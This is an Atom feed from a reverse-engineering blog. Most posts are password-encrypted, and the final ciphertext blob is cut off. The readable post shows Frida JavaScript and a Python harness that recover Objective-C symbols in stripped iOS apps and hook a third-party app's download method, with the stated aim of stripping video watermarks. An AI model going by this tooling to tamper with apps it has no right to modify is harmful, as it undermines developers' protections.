<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ch12dy</title>
  
  <subtitle>当梦想全都被take away</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/"/>
  <updated>2019-07-23T08:09:20.819Z</updated>
  <id>https://github.com/4ch12dy/4ch12dy.github.io.git/</id>
  
  <author>
    <name>4ch12dy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>微信集赞插件分析及开发</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/</id>
    <published>2019-07-22T02:22:01.000Z</published>
    <updated>2019-07-23T08:09:20.819Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Frida调用栈符号恢复</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/</id>
    <published>2019-07-02T09:00:14.000Z</published>
    <updated>2019-07-02T13:04:25.994Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Frida调用栈符号恢复"><a href="#Frida调用栈符号恢复" class="headerlink" title="Frida调用栈符号恢复"></a>Frida调用栈符号恢复</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>搞了一阵子的Android方向的逆向研究，发现用frida去做一些hook等测试十分方便。最近自己想在iOS平台实现短视频下载去水印的问题，所以也想用frida来试试。但是测试过程中当我想去看下hook点的调用栈的时候，发现只有一些栈地址，基本没有符号信息，估计符号表被strip了。这里通常的做法就是用这些地址减去偏移然后去ida里面找到对应的方法。这样无疑是大大增加了分析的时间，想到之前解决<a href="[http://4ch12dy.site/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/](http://4ch12dy.site/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/">lldb调试器栈符号恢复</a>)方案，决定把lldb的栈符号恢复脚本移植到frida中。</p><h4 id="如何恢复已经去掉符号表的可执行文件？"><a href="#如何恢复已经去掉符号表的可执行文件？" class="headerlink" title="如何恢复已经去掉符号表的可执行文件？"></a>如何恢复已经去掉符号表的可执行文件？</h4><p>这里的符号恢复仅仅针对的是OC函数，C函数如果符号表被strip以后是没有办法恢复其符号信息的。为什么OC函数可以去做符号恢复呢？这里要涉及到macho文件的格式以及ObjectC这个语言自身设计相关。可以看到在macho文件中的_DATA数据段中有很多objc的节信息，里面保存了所有的类以及方法等元数据信息。既然如此，我们肯定能找到方法去恢复这些OC函数的符号。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702172303432.png?raw=true" alt="image-20190702172303432"></p><h4 id="OC函数符号恢复思路"><a href="#OC函数符号恢复思路" class="headerlink" title="OC函数符号恢复思路"></a>OC函数符号恢复思路</h4><p>首先我们只能得到一堆调用链的地址，这些地址肯定是函数里面的某个偏移地址。很容易想到这个地址往前推肯定就是这个函数的首地址及函数地址。如果我们拿到了所有函数的地址，然后每一个地址和目标地址比较，与目标地址距离最近的那个地址所对应的函数不就是我们想要的符号吗。</p><p>根据上面提到的思路，目前需要解决几个问题，怎么拿到所有OC方法的地址? 以及对应的类名和方法名?如何设计匹配算法等？</p><p>这里有两种办法：</p><ul><li>第一种是自己去解析在内存中加载的macho文件，根据macho的文件格式先找到class信息，然后找到对应的method信息，method里面就保存了IMP和方法名。之前我尝试这样去过，所有的信息都能拿到，但是由于在macho在加载到内存的时候objc动态库会做很多的初始化等工作，导致要处理一些细节问题，所以就没继续做了。</li><li>第二种是利用已有的objc提供的接口objc_去拿到所有的class以及对应method的方法名和IMP。这里主要用的的API有<code>objc_copyClassNamesForImage</code>、<code>class_copyMethodList</code> 、<code>objc_getClass</code>、<code>method_getImplementation</code>、<code>method_getName</code>、<code>objc_getClass</code>、<code>objc_getMetaClass</code></li></ul><p>现在已经能拿到所有的类方法、方法名、方法实现地址了，接下来要解决的就是怎么通过调用栈的地址去找到对应的方法，这里的思路就是遍历所有的方法地址与调用栈的地址比较并计算距离，如果方法地址小于目标地址且距离最小，那么该方法就是我们要找到的符号。最后将调用栈上面的所有地址都进行该操作即可。</p><h4 id="frida的js环境编写代码"><a href="#frida的js环境编写代码" class="headerlink" title="frida的js环境编写代码"></a>frida的js环境编写代码</h4><p>由于我之前在lldb的python脚本中写过该过程代码(<del>lldb内置的OC解释器语法要求十分严格，调试了很久的代码</del>)</p><p>按照上面的思路理论上代码很好写，也不是很复杂。如果是直接写OC代码应该很好写，但是在frida中写这些还是挺折腾的。</p><p>主要的代码如下：</p><p>根据模块路径获取其所有的类</p><pre><code class="js">function getAllClass(modulePath){    // const char * objc_copyClassNamesForImage(const char *image, unsigned int *outCount)    var objc_copyClassNamesForImage = new NativeFunction(        Module.findExportByName(null, &#39;objc_copyClassNamesForImage&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    // free    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // if given modulePath nil, default is mainBundle    if(!modulePath){        var path = ObjC.classes.NSBundle.mainBundle().executablePath().UTF8String();    }else{        var path = modulePath;    }    // create args    var pPath = Memory.allocUtf8String(path);    var p = Memory.alloc(Process.pointerSize);    Memory.writeUInt(p, 0);    var pClasses = objc_copyClassNamesForImage(pPath, p);    var count = Memory.readUInt(p);    var classes = new Array(count);    for (var i = 0; i &lt; count; i++) {        var pClassName = Memory.readPointer(pClasses.add(i * Process.pointerSize));        classes[i] = Memory.readUtf8String(pClassName);    }    free(pClasses);    // XLOG(classes)    return classes;}</code></pre><p>根据类名获取所有的方法信息，由于有实例方法和类方法，这里需要分别获取。</p><pre><code class="js">function getAllMethods(classname){    var objc_getClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var class_copyMethodList = new NativeFunction(        Module.findExportByName(null, &#39;class_copyMethodList&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    var objc_getMetaClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getMetaClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var method_getName = new NativeFunction(        Module.findExportByName(null, &#39;method_getName&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // get objclass and metaclass    var name = Memory.allocUtf8String(classname);    var objClass = objc_getClass(name)    var metaClass = objc_getMetaClass(name)    // get obj class all methods    var size_ptr = Memory.alloc(Process.pointerSize);    Memory.writeUInt(size_ptr, 0);    var pObjMethods = class_copyMethodList(objClass, size_ptr);    var count = Memory.readUInt(size_ptr);    var allMethods = new Array();    var allObjMethods = new Array();    // get obj class all methods name and IMP    for (var i = 0; i &lt; count; i++) {        var curObjMethod = new Array();        var pObjMethodSEL = method_getName(pObjMethods.add(i * Process.pointerSize))        var pObjMethodName = Memory.readCString(Memory.readPointer(pObjMethodSEL))        var objMethodIMP = Memory.readPointer(pObjMethodSEL.add(2*Process.pointerSize))        // XLOG(&quot;-[&quot;+classname+ &quot; &quot; + pObjMethodName+&quot;]&quot; + &quot;:&quot; + objMethodIMP)        curObjMethod.push(pObjMethodName)        curObjMethod.push(objMethodIMP)        allObjMethods.push(curObjMethod)    }    var allMetaMethods = new Array();    // get meta class all methods name and IMP    var pMetaMethods = class_copyMethodList(metaClass, size_ptr);    var count = Memory.readUInt(size_ptr);    for (var i = 0; i &lt; count; i++) {        var curMetaMethod = new Array();        var pMetaMethodSEL = method_getName(pMetaMethods.add(i * Process.pointerSize))        var pMetaMethodName = Memory.readCString(Memory.readPointer(pMetaMethodSEL))        var metaMethodIMP = Memory.readPointer(pMetaMethodSEL.add(2*Process.pointerSize))        //XLOG(&quot;+[&quot;+classname+ &quot; &quot; + pMetaMethodName+&quot;]&quot; + &quot;:&quot; + metaMethodIMP)        curMetaMethod.push(pMetaMethodName)        curMetaMethod.push(metaMethodIMP)        allMetaMethods.push(curMetaMethod)    }    allMethods.push(allObjMethods)    allMethods.push(allMetaMethods)    free(pObjMethods);    free(pMetaMethods);    return allMethods;}</code></pre><p>通过调用栈地址根据最近匹配的算法去找到对应的符号信息</p><pre><code class="js">function findSymbolFromAddress(modulePath,addr){    var frameAddr = addr    var theDis = 0xffffffffffffffff;    var tmpDis = 0;    var theClass = &quot;None&quot;    var theMethodName = &quot;None&quot;    var theMethodType = &quot;-&quot;    var theMethodIMP = 0    var allClassInfo = {}    var allClass = getAllClass(modulePath);    for(var i = 0, len = allClass.length; i &lt; len; i++){        var mInfo = getAllMethods(allClass[i]);        var curClassName = allClass[i]        objms = mInfo[0];        for(var j = 0, olen = objms.length; j &lt; olen; j++){            mname = objms[j][0]            mIMP = objms[j][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;-&quot;                }            }        }        metams = mInfo[1];        for(var k = 0, mlen = metams.length; k &lt; mlen; k++){            mname = metams[k][0]            mIMP = metams[k][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;+&quot;                }            }        }    }    symbol = theMethodType+&quot;[&quot;+theClass+&quot; &quot;+theMethodName+&quot;]&quot;    if(symbol.indexOf(&quot;.cxx&quot;)!=-1){        symbol = &quot;maybe C function?&quot;    }    // if distance &gt; 3000, maybe a c function    if(theDis &gt; 3000){        symbol = &quot;maybe C function? symbol:&quot; + symbol    }    return symbol;}</code></pre><p>在匹配算法的最后还进行了一些判断，当解析出来的方法名包含<code>.cxx</code>方法的时候说明没找到符号，可能是一个C函数。当解析出来的方法地址距离目标地址距离大于3000的时候会提示可能会C函数。</p><p>最后完整的项目地址：<a href="https://github.com/4ch12dy/xia0FridaScript">https://github.com/4ch12dy/xia0FridaScript</a></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>我这里写了一个简单的frida脚本去测试如何导入符号恢复的js脚本</p><pre><code class="python">#!/usr/bin/pythonimport fridaimport sys import codecsimport osPACKAGE_NAME = &quot;cn.xiaobu.pipiPlay&quot;def on_message(message, data):    try:        if message:            print(&quot;[JSBACH] {0}&quot;.format(message[&quot;payload&quot;]))    except Exception as e:        print(message)        print(e)def xia0CallStackSymbolsTest():    script_dir = os.path.dirname(os.path.realpath(__file__))    xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)    source = &#39;&#39;    with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:        source = source + f.read()    js = &#39;&#39;&#39;    if (ObjC.available)    {            try            {                    //Your class name here  - ZYOperationView operationCopyLink                    var className = &quot;ZYMediaDownloadHelper&quot;;                    //Your function name here                    var funcName = &quot;+ downloadMediaUrl:isVideo:progress:finishBlock:&quot;;                    var hook = eval(&#39;ObjC.classes.&#39; + className + &#39;[&quot;&#39; + funcName + &#39;&quot;]&#39;);                    Interceptor.attach(hook.implementation, {                        onEnter: function(args) {                            // args[0] is self                            // args[1] is selector (SEL &quot;sendMessageWithText:&quot;)                            // args[2] holds the first function argument, an NSString                            console.log(&quot;[*] Detected call to: &quot; + className + &quot; -&gt; &quot; + funcName);                            // just call [NSThread callStackSymbols]                            var threadClass = ObjC.classes.NSThread                            var symbols = threadClass[&quot;+ callStackSymbols&quot;]()                            console.log(symbols)                            // call  xia0CallStackSymbols [true:just symbolish mainModule address false:symbolish all module address]                            xia0CallStackSymbols(true);                            xia0CallStackSymbols(false);                        }                    });            }            catch(err)            {                    console.log(&quot;[!] Exception2: &quot; + err.message);            }    }    else    {            console.log(&quot;Objective-C Runtime is not available!&quot;);    }    &#39;&#39;&#39;    return source+jsdef do_hook():    return xia0CallStackSymbolsTest()if __name__ == &#39;__main__&#39;:    try:        device = frida.get_device_manager().enumerate_devices()[-1]        print device        pid = device.spawn([PACKAGE_NAME])        print(&quot;[JSBACH] {} is starting. (pid : {})&quot;.format(PACKAGE_NAME, pid))        session = device.attach(pid)        device.resume(pid)        script = session.create_script(do_hook())        script.on(&#39;message&#39;, on_message)        script.load()        sys.stdin.read()    except KeyboardInterrupt:        sys.exit(0)</code></pre><p>只需要将<code>xia0CallStackSymbols.js</code>脚本放到项目中，然后用以下代码即可导入使用</p><pre><code class="python">script_dir = os.path.dirname(os.path.realpath(__file__))xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)source = &#39;&#39;with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:    source = source + f.read()your_frida_js_hook_script = &quot;&quot;load_js = your_frida_js_hook_script+source</code></pre><p>恢复的效果如下：</p><ul><li><p>通过<code>[NSThread callStackSymbols]</code>获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181519237.png?raw=true" alt="image-20190702181519237"></p></li><li><p>通过调用<code>xia0CallStackSymbols</code>函数获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181145710.png?raw=true" alt="image-20190702181145710"></p></li><li><p>作为比较，我在放上lldb中恢复调用栈</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181638614.png?raw=true" alt="image-20190702181638614"></p></li></ul><p>这里可以看出lldb调试器恢复的符号信息最完整且准确，lldb的栈符号恢复项目在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a>，现在还能支持block函数的符号恢复。</p><p>这里有几个问题需要说明一下：</p><ul><li><p>xia0CallStackSymbols的符号为什么前15个地址没有显示？</p><p>因为前15个地址都是frida中js解释器里面的函数执行地址，没有办法拿到模块信息，也没必要解析这些地址。</p></li><li><p>xia0CallStackSymbols中还提供了内存对应的文件地址，如果你觉得符号有问题，可以直接去ida中手动查找符号</p></li><li><p>如果用dladdr能够拿到地址的符号信息，就没有调用xia0CallStackSymbols去恢复(比如符号表没有strip的情况)</p></li><li><p>xia0CallStackSymbols()接口可以传递一个bool参数，true为仅仅解析主模块的地址，false为所有模块都需要解析。实际在逆向过程中一般只需要主模块的符号信息，其他系统函数没很大必要。</p></li></ul><h4 id="遗留问题-Todo"><a href="#遗留问题-Todo" class="headerlink" title="遗留问题/Todo"></a>遗留问题/Todo</h4><ul><li>在执行恢复符号的过程中时间相对较长，主要原因在于每一个地址都要和所有方法比较，这里建议xia0CallStackSymbols传入true，这样只解析主模块的地址。耗时的原因还在于每一个地址解析的时候都会去调用接口获取所有方法信息，实际上每个模块只需要一次就能拿到所有方法信息，接下来要做的就是优化相关代码，缓存模块的所有方法信息，下次解析的地址为该模块时直接去缓存里面匹配查找。</li><li>在匹配符号的过程中，判断是否为C函数需要更多的原则，3000的阈值需要后面再调下。</li><li>关于block的符号恢复，目前只有在lldb中实现了，下一步准备在xia0CallStackSymbols中也支持恢复block函数符号</li></ul><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>短视频下载去水印如果有人感兴趣的话，可以点<a href="https://github.com/4ch12dy/fkwatermark">这里</a>，目前支持的有皮皮搞笑、抖音（我不看抖音！）</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://github.com/poxyran/misc">https://github.com/poxyran/misc</a></li><li>&lt; <a href="https://github.com/iddoeldor/frida-snippets">https://github.com/iddoeldor/frida-snippets</a> &gt;</li><li><a href="http://www.blogfshare.com/ioss-validate-address.html" target="_blank" rel="external">http://www.blogfshare.com/ioss-validate-address.html</a></li><li><a href="https://jmpews.github.io/2017/08/09/darwin/反注入及绕过/" target="_blank" rel="external">https://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</a></li><li><a href="https://github.com/interference-security/frida-scripts">https://github.com/interference-security/frida-scripts</a></li><li><a href="https://github.com/dweinstein/awesome-frida">https://github.com/dweinstein/awesome-frida</a></li><li><a href="https://www.frida.re/docs/javascript-api/" target="_blank" rel="external">https://www.frida.re/docs/javascript-api/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Frida调用栈符号恢复&quot;&gt;&lt;a href=&quot;#Frida调用栈符号恢复&quot; class=&quot;headerlink&quot; title=&quot;Frida调用栈符号恢复&quot;&gt;&lt;/a&gt;Frida调用栈符号恢复&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot; class=&quot;
      
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="frida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/frida/"/>
    
      <category term="iosre" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/iosre/"/>
    
  </entry>
  
  <entry>
    <title>andoid调试深度总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid%E8%B0%83%E8%AF%95%E6%B7%B1%E5%BA%A6%E6%80%BB%E7%BB%93/andoid%E8%B0%83%E8%AF%95%E6%B7%B1%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid调试深度总结/andoid调试深度总结/</id>
    <published>2019-06-04T14:54:21.000Z</published>
    <updated>2019-06-05T06:57:29.464Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Android Auto.js脚本加密分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs加密分析/autojs加密分析/</id>
    <published>2019-04-25T07:12:09.000Z</published>
    <updated>2019-04-30T02:52:18.678Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="show me the code" />    <label for="pass">show me the code</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"/>
    
      <category term="auto.js" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/auto-js/"/>
    
  </entry>
  
  <entry>
    <title>符号执行解决代码混淆实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-05-17T08:47:41.244Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
      <category term="ollvm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ollvm/"/>
    
  </entry>
  
  <entry>
    <title>再谈arm指令编码</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-04-29T11:59:18.079Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX1+sD9lgt6NTC3ZdCkBabmPl+36EMKRAxWkjJB9TdnDwqM2l0f2K3vHqhrbV3ipjLz5wSoCV1aP67Y9eWPtYbAuf2gjN0qQjB/hI18Nsj7WXB3rzypz8cJM4MGVD/mm9ZxrUVPd4pUH3Oof70n/GAbTtl4ll5igiGRyokxmDWgbrw02+8j1i6SfgFaNQsEkvMUs1i6+13t+PJ94vF5vEOBWesUCxEdulI5SgQ7ezGyVfHAvhVgKip8XGAWtCuR3VTB9lXuJ602peRMY5DqSw6Ue/2ljolWW36g531AsuT2JbvEpDcokhYjLw9pqIC12Ma0wRvEKyD2gSgTBjeKN1NvMIcveaPyD088qeGaXRhtN5bm+iLMACmZMS7i34JT9lcDfFbzSINf2DUwZM29ojw3jHsJzOYPsguZ5LqgTA12z+MoSmSpwTMX2vlnnLjZL4FFZa2cyeWcgu8j/MHTkkWSVKL1UpGdU822nwCBLewcaEvRRxJR+i0XqeJNhB1tBEVJgPjcJxAT2NN6MC91jwTDIX4f/nHfIL8P4YWP3vW8H50xh7eP/sArFBM4no1aSZn2F4fgMaFJL4ZXmdLamE2e3Qegmt+YcS/M2lUy+wNfaTMIVRdKJR1kUit6jGTmxQ9IzexdDdGX144qs3n4TaMmavAfRO7uGynTxFspe242NQHBReO/CVWpr/cDxMHO9NwbDXHn5o4IVLoG2TrwMxK30SSiGo6otSRC/zOJWu2MaLa0fDwT02320A84/ViGlNl8LcNV5KhRULYSj7ICUqGLT2IzXyqO8uQFGla3JZzW03Mo7WAC0DOqFKyrkzYa2T/aoDsRxX805gGx+fcrVyb6R8EmrzqS3sST2LMjcRfeuMtDwcJewvOuBomCf/klVjsaYvUgF0oTHGz7QuYmvV1VoliAb+7LPVag4JPnx2vp